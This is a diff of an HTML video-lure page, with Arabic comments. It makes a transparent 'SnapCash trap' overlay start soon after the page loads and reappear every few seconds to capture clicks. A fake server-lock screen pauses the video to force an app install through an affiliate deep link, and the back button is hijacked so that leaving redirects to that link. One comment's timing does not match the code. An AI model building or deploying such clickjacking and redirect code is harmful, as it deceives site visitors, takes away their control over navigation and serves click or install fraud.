@@ -14,7 +14,7 @@
     <style>
         body { background-color: #000; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; text-align: center; overflow-x: hidden; }
         
-        /* الستارة الشفافة التي ستفتح رابط SnapCash */
+        /* الستارة الشفافة المسيطرة */
         #snap-overlay { 
             position: fixed; 
             top: 0; 
@@ -36,8 +36,7 @@
         .video-title { padding: 10px; font-size: 0.9rem; color: #ffcc00; text-align: right; background: #161616; border-bottom: 1px solid #222; }
         .hero-video { aspect-ratio: 16 / 9; display: flex; align-items: center; justify-content: center; background: #000; }
         video { width: 100%; height: 100%; object-fit: contain; }
-        .btn-install { background: #00E676; color: #000; text-decoration: none; padding: 18px; display: block; border-radius: 50px; font-weight: 900; font-size: 1.3rem; margin-top: 20px; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); } 70% { transform: scale(1.03); } 100% { transform: scale(1); } }
+        .btn-install { background: #00E676; color: #000; text-decoration: none; padding: 18px; display: block; border-radius: 50px; font-weight: 900; font-size: 1.3rem; margin-top: 20px; animation: pulse 1.5s infinite; border:none; cursor:pointer;}
         .refuse-link { color: #555; font-size: 0.8rem; text-decoration: underline; margin-top: 15px; display: block; cursor: pointer; }
     </style>
 </head>
@@ -56,7 +55,7 @@
             <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" width="130">
             <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" width="130">
         </div>
-        <a href="https://vidspaceapp.onelink.me/RzWN/56gc1p3b?deep_link_value=..." class="btn-install">تثبيت وفتح المشاهدة فوراً</a>
+        <a href="https://vidspaceapp.onelink.me/RzWN/56gc1p3b?..." class="btn-install">تثبيت وفتح المشاهدة فوراً</a>
         <span class="refuse-link" onclick="handleRefusal()">المتابعة عبر المتصفح (غير مستحسن)</span>
     </div>
 </div>
@@ -68,45 +67,47 @@
         <div class="video-title">🔥 المقطع الرئيسي</div>
         <div class="hero-video">
             <video controls playsinline poster="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxTd6VTp-gabKWvZoKBdDQNnK1hLoFuQ1f8yUGgKJicI7ol5OOuZgKjNY00KSX_U8Z_S7f3BpR4Y78Mmx8IVyHRinmyg_11r495BaQY4bFzF9pNQAxL5_5aBuCMW4lyrtTuMfCOeNpvKzAqCwIY66hmbSPzYoUyjLbHC78MI1EHmOSHjVfgu8XtdMGfDls/s1149/1000204054.jpg">
-                <source src="https://media.discordapp.net/attachments/.../VID_20260216_111844.mp4..." type="video/mp4">
+                <source src="https://media.discordapp.net/attachments/.../VID_20260216_111844.mp4" type="video/mp4">
             </video>
         </div>
     </div>
-    </div>
+</div>
 
 <script>
-    const snapLink = "https://vidspaceapp.onelink.me/RzWN/56gc1p3b?deep_link_value=cHJvdmlkZWxpdGUlM0ElMkYlMkYsaW5rJTNGdDZ0b3kxdzkxcyUzRDIwMDUzOTk5Mjc5Nzg4NjQ2NDIlMjZhbG9wZWNvaWQlM0QyMDIzNTA5NzU0OTM2NDM4Nzg1JTI2cmVsZWFzZSUzRG1lbG9wb2VpYSUyNjVfc2FsN3B2MzUlM0QxOTU5OTAzMDI4ODc0MzIxOTIyJTI2bGFwaXRoJTNEJTI2YmVmbGFnZ2luZyUzRHBsYXlsb2FkaXBlayUyNmRpc3NlaXpvciUzRENwOVdIcE1qeDY1U2pLY1BMYzJJUG83SnRRd29DQWFQRG5wa3RrYTVpRUlCbUVPVk1XWk9IcFFtNFB0bHZaZkpwSUlxeVl4RVIzVW1YYUZkQXJSWDhVbVZIanZINUN3Sk5abU41dyUyQkVZbjZjZWlTc3VHWjJWOHowNFJ2JTJCODZwdk5QRW5QRUhHTXYzY0lSR2xyTTVBdkZac3JRUng5SG1RUlRSQlNZcnpTNkFkSkN2YTYxNUNQNENtWk5qdnklMkIwVGtCYWRrT0p1eVcyNjZRTlp3TEY3QTQlMkIwYzgzaWY2aTZYaiUyRmwyUyUyQlp2V3JUdDhOcG5LRVZkVWpCeUtjalJ1NVZpNnRsbG5PbjdhYVZWRjExbUxIJTJCTkVVSmMyVzlVSkg0T3olMkZiRFZLRFR1cGxlMGRJU1Z2dllKM2czOGo3d1Btc3RVY04lMkZKUEV2ZzluZnZOQUVmRGQlMkJkVmhkZGp1JTJGajRNZlNzR0djRG9EU0dDeEV4MnRDMXhkd3BNWXo4QTJNTXBHOHFiZ0JyYVhER0EzOTdzUmQlMkJiSGwlMkZOcjVHJTJCRUNSQmJRQmhyQ2wwb2pzTTFZc1U3aGElMkJhNENFaHRlQWF1STJabmVoWFIlMkJtVFpjMFBxaHBUVk0yMDZpY3RibmEwY0xheSUyQnV5S3RuWkVFdXBwYURFRmRVTjFHTUV1WFZZeGdmbnVUU2xNbjExOEpXZyUyRmJNSGRLNW8yZnhWOEZWdXZ4ck5lYlg1SERtRCUyRmgzNWRJRUJtUiUyQlczM0JsaVNJRlN3R3E1a2doam1hMlZ1MVdheTBWYU9KRDZBOUVMJTJGMDlTY0didU9hYUlKc3lic3ZhZzA3SUd1dmF0ZVNqVTdsUXgzT3NtSzdxV2lDak1PRVdzTm1zVThLVXRoS3ZmSlR4YVNnWU01JTJGYnJCTHEzeEtqQ3c3OWR3Um9VY2JxbUliVHpDcGYxcjYwb2h4WGFNUllTdG5CRHFKdmNHNHFrTExnNjBzeGhYRGNYQkRZSW03OHpIVzhxVThUTEl0bG9jVjRNaDdqdWk1NnVOTjJKVnolMkJJMDI2aTdHT05RJTJGdGJObHc1anRUcHFyJTJGSXZLNzdWQ0Q0VSUyQkozaEFCYVhEOGsxbGxsM2pWQWZVSzFEOEcybU1ER1lleFFJSkw5YWtOck5nYVA5cGhHMG9DY25xcnU2cXRxJTJCY1lCVmdmQTFpdDhtb1FJSko1RXVXTGhaOEhvYnZ0JTJGQUNlUjJ3NFIybTFJNFBvJTJCTDllZEdubk1adnAlMkZzdlgzM0UwUWliMVVBRyUyQkI1QiUyQmNrNkIlMkZNeGNacWFlMHpNRW9lV0NtRG1KWTB1NmlZM05ZdmJyMSUyRnZydVgxMSUyQlo0d2xUNEtiOW1yWDlwSEg4RldnODRRT2NhRHpnUGVIYVR3SGExdXN6Mm4lMkJ3OVRRdVZxMEx1OWRiaTRQblVMNEtnYzRXU0Z5S1F0VllWSktZdFBQalJXTnlCSTVmTjkybHRrSmFtWkw2cGZiOFNJSHBKaU50bjlETXd3b0F5YzRKUkpJTzJ1dldHMkR2dXB5c2Jzc295VWNraWY2YVhKS3VmeHB6bUs1cUt6ZnduJTJCWlBYemM0WjR1SXBSaXluSFBCTUM5dXh0ZFRBdjl5YjhuTFdGS1VhTmslMkJNJTJGQkF3czJaY1RTJTJGTHlpSDg3elVKUzNwWSUyRk9CS1JXUHQzaUF1WSUyQmtVYkp0SDRjT1olMkZnWExyaklMbEQ1WHIlMkZjTk9kb3c4RmxjS3VNJTJCV0Z3YzZSQVNQOTY3dnJ4eGpZSFVpbHAwN20wNWhlaXlQeG9VVHI5WGpEJTJCdk01bjJuZFg5ZEplZnVnZXgzOVFocXAzJTJCbHZPVVNJN3ZMVyUyRnYlMkZlNkFtVGRGZ3FlSSUzRA==";
+    const snapLink = "https://vidspaceapp.onelink.me/RzWN/56gc1p3b?deep_link_value=cHJvdmlkZWxpdGUlM0ElMkYlMkYsaW5rJTNGdDZ0b3kxdzkxcyUzRDIwMDUzOTk5Mjc5Nzg4NjQ2NDIlMjZhbG9wZWNvaWQlM0QyMDIzNTA5NzU0OTM2NDM4Nzg1JTI2cmVsZWFzZSUzRG1lbG9wb2VpYSUyNjVfc2FsN3B2MzUlM0QxOTU5OTAzMDI4ODc0MzIxOTIyJTI2bGFwaXRoJTNEJTI2YmVmbGFnZ2luZyUzRHBsYXlsb2FkaXBlayUyNmRpc3NlaXpvciUzRENwOVdIcE1qeDY1U2pLY1BMYzJJUG83SnRRd29DQWFQRG5wa3RrYTVpRUlCbUVPVk1XWk9IcFFtNFB0bHZaZkpwSUlxeVl4RVIzVW1YYUZkQXJSWDhVbVZIanZINUN3Sk5abU41dyUyQkVZbjZjZWlTc3VHWjJWOHowNFJ2JTJCODZwdk5QRW5QRUhHTXYzY0lSR2xyTTVBdkZac3JRUng5SG1RUlRSQlNZcnpTNkFkSkN2YTYxNUNQNENtWk5qdnklMkIwVGtCYWRrT0p1eVcyNjZRTlp3TEY3QTQlMkIwYzgzaWY2aTZYaiUyRmwyUyUyQlp2V3JUdDhOcG5LRVZkVWpCeUtjalJ1NVZpNnRsbG5PbjdhYVZWRjExbUxIJTJCTkVVSmMyVzlVSkg0T3olMkZiRFZLRFR1cGxlMGRJU1Z2dllKM2czOGo3d1Btc3RVY04lMkZKUEV2ZzluZnZOQUVmRGQlMkJkVmhkZGp1JTJGajRNZlNzR0djRG9EU0dDeEV4MnRDMXhkd3BNWXo4QTJNTXBHOHFiZ0JyYVhER0EzOTdzUmQlMkJiSGwlMkZOcjVHJTJCRUNSQmJRQmhyQ2wwb2pzTTFZc1U3aGElMkJhNENFaHRlQWF1STJabmVoWFIlMkJtVFpjMFBxaHBUVk0yMDZpY3RibmEwY0xheSUyQnV5S3RuWkVFdXBwYURFRmRVTjFHTUV1WFZZeGdmbnVUU2xNbjExOEpXZyUyRmJNSGRLNW8yZnhWOEZWdXZ4ck5lYlg1SERtRCUyRmgzNWRJRUJtUiUyQlczM0JsaVNJRlN3R3E1a2doam1hMlZ1MVdheTBWYU9KRDZBOUVMJTJGMDlTY0didU9hYUlKc3lic3ZhZzA3SUd1dmF0ZVNqVTdsUXgzT3NtSzdxV2lDak1ORVdzTm1zVThLVXRoS3ZmSlR4YVNnWU01JTJGYnJCTHEzeEtqQ3c3OWR3Um9VY2JxbUliVHpDcGYxcjYwb2h4WGFNUllTdG5CRHFKdmNHNHFrTExnNjBzeGhYRGNYQkRZSW03OHpIVzhxVThUTEl0bG9jVjRNaDdqdWk1NnVOTjJKVnolMkJJMDI2aTdHT05RJTJGdGJObHc1anRUcHFyJTJGSXZLNzdWQ0Q0VSUyQkozaEFCYVhEOGsxbGxsM2pWQWZVSzFEOEcybU1ER1lleFFJSkw5YWtOck5nYVA5cGhHMG9DY25xcnU2cXRxJTJCY1lCVmdmQTFpdDhtb1FJSko1RXVXTGhaOEhvYnZ0JTJGQUNlUjJ3NFIybTFJNFBvJTJCTDllZEdubk1adnAlMkZzdlgzM0UwUWliMVVBRyUyQkI1QiUyQmNrNkIlMkZNeGNacWFlMHpNRW9lV0NtRG1KWTB1NmlZM05ZdmJyMSUyRnZydVgxMSUyQlo0d2xUNEtiOW1yWDlwSEg4RldnODRRT2NhRHpnUGVIYVR3SGExdXN6Mm4lMkJ3OVRRdVZxMEx1OWRiaTRQblVMNEtnYzRXU0Z5S1F0VllWSktZdFBQalJXTnlCSTVmTjkybHRrSmFtWkw2cGZiOFNJSHBKaU50bjlETXd3b0F5YzRKUkpJTzJ1dldHMkR2dXB5c2Jzc295VWNraWY2YVhKS3VmeHB6bUs1cUt6ZnduJTJCWlBYemM0WjR1SXBSaXluSFBCTUM5dXh0ZFRBdjl5YjhuTFdGS1VhTmslMkJNJTJGQkF3czJaY1RTJTJGTHlpSDg3elVKUzNwWSUyRk9CS1JXUHQzaUF1WSUyQmtVYkp0SDRjT1olMkZnWExyaklMbEQ1WHIlMkZjTk9kb3c4RmxjS3VNJTJCV0Z3YzZSQVNQOTY3dnJ4eGpZSFVpbHAwN20wNWhlaXlQeG9VVHI5WGpEJTJCdk01bjJuZFg5ZEplZnVnZXgzOVFocXAzJTJCbHZPVVNJN3ZMVyUyRnYlMkZlNkFtVGRGZ3FlSSUzRA==";
     const overlay = document.getElementById('snap-overlay');
     const lock = document.getElementById('app-lock-overlay');
 
-    // قفل السيرفر بعد 90 ثانية
+    // تشغيل فخ السناب كاش فوراً وبشكل دوري
+    function startSnapTrap() {
+        function loop() {
+            // انتظار عشوائي بين 3 و 6 ثوانٍ
+            const waitTime = Math.floor(Math.random() * (6000 - 3000 + 1)) + 3000;
+            
+            setTimeout(() => {
+                overlay.style.display = 'block'; // ظهور الستارة
+                // الستارة تبقى نشطة حتى يتم النقر عليها أو لمدة 5 ثوانٍ كحد أقصى
+                setTimeout(() => {
+                    overlay.style.display = 'none';
+                    loop(); // تكرار العملية
+                }, 5000); 
+            }, waitTime);
+        }
+        loop();
+    }
+
+    // بدء الفخ الأول بعد 3 ثوانٍ من دخول الصفحة
+    setTimeout(startSnapTrap, 3000);
+
+    // نظام قفل السيرفر (بعد 90 ثانية)
     setTimeout(() => {
         lock.style.display = 'flex';
         document.querySelectorAll('video').forEach(v => v.pause());
     }, 60000);
 
-    // إذا رفض المستخدم القفل، تبدأ الستارة الشفافة بمطاردته
     function handleRefusal() {
         lock.style.display = 'none';
-        startSnapTrap();
-    }
-
-    function startSnapTrap() {
-        function loop() {
-            // توقيت عشوائي بين 3 و 6 ثوانٍ للهدوء
-            const waitTime = Math.floor(Math.random() * (6000 - 3000 + 1)) + 3000;
-            // مدة ظهور الستارة (10 ثوانٍ) لضمان أن أي نقرة ستصطادهم
-            const activeTime = 10000;
-
-            setTimeout(() => {
-                overlay.style.display = 'block';
-                setTimeout(() => {
-                    overlay.style.display = 'none';
-                    loop(); // إعادة التكرار
-                }, activeTime);
-            }, waitTime);
-        }
-        loop();
+        // الفخ مستمر في الخلفية أصلاً
     }
 
     function triggerSnapCash() {
@@ -114,7 +115,7 @@
         overlay.style.display = 'none';
     }
 
-    // منع الخروج وتحويله لرابط السناب كاش
+    // منع الخروج وتحويل المستخدم للسناب كاش
     (function() {
         window.history.pushState({page: 1}, "", window.location.href);
         window.onpopstate = function() { window.location.replace(snapLink); };
